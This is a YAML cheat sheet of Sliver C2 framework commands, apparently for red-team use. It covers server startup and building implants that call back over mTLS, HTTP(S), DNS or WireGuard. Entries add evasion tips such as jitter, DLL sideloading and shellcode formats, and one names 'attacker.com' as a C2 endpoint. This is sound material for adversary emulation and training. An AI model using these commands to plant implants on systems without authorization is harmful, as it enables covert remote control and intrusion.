  # ============================================================================
  # GETTING STARTED
  # ============================================================================
  
  - title: sliver - start server
    desc: |
      Start the Sliver C2 server. The server manages implants, sessions, beacons,
      and all C2 infrastructure. Run this on your C2 server host (preferably Linux/MacOS).
      The server will generate certificates and keys automatically on first run.
    command: "sliver-server"

  - title: sliver - start client and connect
    desc: |
      Start the Sliver client and connect to a server. The client will prompt you
      to select a server configuration if multiple configs are available. Client
      connects to server via gRPC/mTLS on port 31337 by default.
    command: "sliver-client"

  - title: sliver - show help
    desc: |
      Display general help and list all available commands. Shows command categories
      including generate, sessions, beacons, jobs, and more.
    command: "sliver > help"

  - title: sliver - show command help
    desc: |
      Display detailed help for a specific command. Shows all available flags,
      arguments, and usage examples for the command.
    command: "sliver > {{command|generate}} --help"

  - title: sliver - show version
    desc: |
      Display Sliver version information. Useful for checking installed version
      or reporting issues.
    command: "sliver > version"

  # ============================================================================
  # IMPLANT GENERATION - BASIC
  # ============================================================================

  - title: sliver - generate mTLS implant (session mode)
    desc: |
      Generate a Sliver implant using Mutual TLS (mTLS) C2 in session mode.
      Session mode provides real-time interactive communication. mTLS is the most
      secure and recommended C2 protocol. The implant will connect to the specified
      domain/IP on port 8888 by default.
    command: "sliver > generate --mtls {{domain|example.com}} --save {{output_dir|/tmp}}"

  - title: sliver - generate mTLS implant (beacon mode)
    desc: |
      Generate a Sliver implant using mTLS C2 in beacon mode. Beacon mode uses
      asynchronous check-ins where the implant periodically polls for tasks.
      More stealthy but less responsive than session mode. Default check-in is 60s.
    command: "sliver > generate --mtls {{domain|example.com}} --save {{output_dir|/tmp}} --beacon"

  - title: sliver - generate HTTP implant
    desc: |
      Generate a Sliver implant using HTTP(S) C2. The implant will attempt HTTPS
      first, then fall back to HTTP if HTTPS fails. HTTP C2 supports proxy-aware
      connections and can blend in with normal web traffic.
    command: "sliver > generate --http {{domain|example.com}} --save {{output_dir|/tmp}}"

  - title: sliver - generate HTTPS implant
    desc: |
      Generate a Sliver implant using HTTPS C2. Requires SSL/TLS certificate
      configuration. Can use Let's Encrypt for automatic certificate generation
      or provide custom certificates.
    command: "sliver > generate --https {{domain|example.com}} --save {{output_dir|/tmp}}"

  - title: sliver - generate DNS implant
    desc: |
      Generate a Sliver implant using DNS C2. Useful for highly restricted networks
      where only DNS queries are allowed. Slower than other protocols but can bypass
      network restrictions. Always use FQDN (with trailing dot) for DNS domains.
    command: "sliver > generate --dns {{fqdn|1.example.com.}} --save {{output_dir|/tmp}}"

  - title: sliver - generate WireGuard implant
    desc: |
      Generate a Sliver implant using WireGuard C2. WireGuard provides fast, encrypted
      VPN-like connectivity. Requires WireGuard listener setup and client configuration.
      Best performance for port forwarding and SOCKS proxies.
    command: "sliver > generate --wg {{lhost|192.168.1.100}} --save {{output_dir|/tmp}}"

  - title: sliver - generate for specific OS/arch
    desc: |
      Generate an implant for a specific operating system and architecture.
      Sliver supports cross-compilation for Windows, Linux, and MacOS on multiple
      architectures (amd64, 386, arm64, etc.). Use --os and --arch flags.
    command: "sliver > generate --mtls {{domain|example.com}} --os {{os|windows}} --arch {{arch|amd64}} --save {{output_dir|/tmp}}"

  - title: sliver - generate with multiple C2 endpoints
    desc: |
      Generate an implant with multiple C2 endpoints for redundancy. The implant
      will try each endpoint in sequence (or randomly based on strategy). Useful for
      failover scenarios or multi-domain setups.
    command: "sliver > generate --mtls {{domain1|example.com}} --http {{domain2|attacker.com}} --dns {{fqdn|1.example.com.}} --save {{output_dir|/tmp}}"

  - title: sliver - generate with connection strategy
    desc: |
      Set the connection strategy for multiple endpoints. 's' = sequential (default,
      tries in order), 'r' = random (randomly selects endpoint), 'rd' = random domain
      (random domain but sequential protocol). Sequential is most performant.
    command: "sliver > generate --mtls {{domain1|foo.com}} --mtls {{domain2|bar.com}} --strategy {{strategy|r}} --save {{output_dir|/tmp}}"

  - title: sliver - generate with custom beacon interval
    desc: |
      Set custom beacon check-in interval for beacon mode implants. Default is 60s.
      Lower intervals = faster response but more network traffic. Higher intervals
      = more stealthy but slower task execution. Format: 30s, 5m, 1h, etc.
    command: "sliver > generate --mtls {{domain|example.com}} --beacon --seconds {{interval|30}} --save {{output_dir|/tmp}}"

  - title: sliver - generate with jitter
    desc: |
      Add random jitter to beacon check-in intervals. Jitter randomizes the check-in
      time to avoid predictable patterns. Format: percentage (0-100) or duration.
      Helps avoid detection by timing analysis.
    command: "sliver > generate --mtls {{domain|example.com}} --beacon --jitter {{jitter|30}} --save {{output_dir|/tmp}}"

  - title: sliver - generate with debug symbols
    desc: |
      Generate an implant with debug symbols enabled. Useful for troubleshooting
      connection issues or development. Debug builds are larger and easier to detect.
      Only use during testing, not in production engagements.
    command: "sliver > generate --mtls {{domain|example.com}} --debug --save {{output_dir|/tmp}}"

  - title: sliver - generate shellcode format
    desc: |
      Generate an implant in shellcode format instead of executable. Shellcode can
      be injected into processes or used with stagers. Requires MinGW for Windows
      shellcode generation. Format options: EXECUTABLE, SHARED_LIB, SHELLCODE.
    command: "sliver > generate --mtls {{domain|example.com}} --format {{format|shellcode}} --save {{output_dir|/tmp}}"

  - title: sliver - generate DLL format
    desc: |
      Generate an implant as a Windows DLL (shared library). DLLs can be loaded via
      rundll32, regsvr32, or sideloaded into processes. Useful for evasion and
      persistence techniques. Requires MinGW on the server.
    command: "sliver > generate --mtls {{domain|example.com}} --format {{format|shared}} --os windows --save {{output_dir|/tmp}}"

  - title: sliver - generate with obfuscation disabled
    desc: |
      Generate an implant with symbol obfuscation disabled. Obfuscation makes static
      analysis harder but increases compile time and memory usage. Disable for faster
      builds or compatibility issues.
    command: "sliver > generate --mtls {{domain|example.com}} --skip-symbols --save {{output_dir|/tmp}}"

  - title: sliver - generate with canary domains
    desc: |
      Add canary domains to the implant. Canary domains are unique per-binary domains
      that are deliberately not obfuscated. If these domains are ever resolved (and you
      have a DNS listener), you'll get an alert indicating the binary was discovered.
    command: "sliver > generate --mtls {{domain|example.com}} --canary {{canary|1.example.com.}} --save {{output_dir|/tmp}}"

  - title: sliver - list generated implants
    desc: |
      List all previously generated implants. Shows implant names (code names),
      OS/architecture, debug status, format, and other metadata. Useful for tracking
      which implants were generated and their configurations.
    command: "sliver > implants"

  - title: sliver - regenerate existing implant
    desc: |
      Regenerate a previously created implant using the same configuration. Useful
      if you need to re-download an implant or regenerate with same settings.
      Positional arguments (implant name) come after flags.
    command: "sliver > regenerate --save {{output_dir|/tmp}} {{implant_name|NEW_GRAPE}}"
